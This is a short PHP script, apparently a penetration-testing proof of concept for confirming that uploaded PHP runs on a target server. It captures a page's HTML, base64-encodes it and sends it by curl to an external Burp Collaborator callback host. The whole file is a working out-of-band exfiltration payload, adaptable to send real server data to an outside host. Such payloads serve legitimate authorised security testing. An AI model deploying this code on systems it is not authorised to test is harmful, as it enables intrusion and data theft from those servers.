<?php
// Collaborator endpoint
$burp_url = 'http://z88oaytd0j2o7a3i8fzid3ifn6t7h95y.oastify.com';

// Output buffering to capture HTML response
ob_start();
?>
<!-- Simulated HTML content -->
<html>
  <body>
    <h1>PHP executed on server</h1>
  </body>
</html>
<?php
$html = ob_get_clean(); // End buffer, capture content

// Encode as Base64 (acts like a "screenshot" of HTML response)
$base64_html = base64_encode($html);

// Send the Base64 data to Burp Collaborator
// Split if needed to avoid URL length limits
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $burp_url . '?b64=' . urlencode(substr($base64_html, 0, 200))); // send only first 200 chars
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Optionally, show the page too
echo $html;
?>
